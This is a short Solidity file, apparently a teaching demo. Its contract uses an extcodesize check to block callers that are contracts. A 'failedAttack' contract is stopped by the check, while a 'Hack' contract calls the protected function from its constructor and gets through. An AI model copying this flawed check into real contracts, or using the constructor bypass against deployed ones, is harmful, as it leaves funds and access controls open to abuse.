//SPDX-License-Identifier:MIT

pragma solidity 0.8.7 ;

contract Findsolution{

  function checkcontract(address account) public view returns(bool){
     uint size ;
     assembly {
          size := extcodesize(account)
     }
     return size > 0 ;
  }

  bool public isaddress =  false;

  function protected () external {
      require(!checkcontract(msg.sender) , "Not allowed for contracts");
      isaddress  = true ;
  }

}


contract failedAttack{

    function check(address _target) external {
        Findsolution(_target).protected() ; 
    }
}


contract Hack {
    constructor (address _target) {
         Findsolution(_target).protected() ;
    }
}


   